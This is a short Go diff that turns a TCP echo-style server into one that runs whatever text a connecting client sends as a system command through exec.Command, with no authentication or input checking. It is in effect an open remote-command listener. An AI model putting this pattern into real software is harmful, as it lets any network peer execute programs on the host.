@@ -4,6 +4,8 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os/exec"
+	"strings"
 )
 
 func main() {
@@ -18,10 +20,22 @@ func main() {
 			log.Fatalf("encountered an error accepting connections: %s", err)
 		}
 		go func(c net.Conn) {
+			defer c.Close()
+
 			buff := make([]byte, 1024)
 			size, _ := c.Read(buff)
-			fmt.Printf("%s\n", buff[:size])
-			c.Close()
+			msg := buff[:size]
+			fmt.Printf("GOT: %s\n", msg)
+
+			var out strings.Builder
+			cmd := exec.Command(string(msg))
+			cmd.Stdout = &out
+			if cmdErr := cmd.Run(); cmdErr != nil {
+				fmt.Println(cmdErr)
+			} else {
+				fmt.Println(out.String())
+			}
+
 		}(conn)
 	}
 }
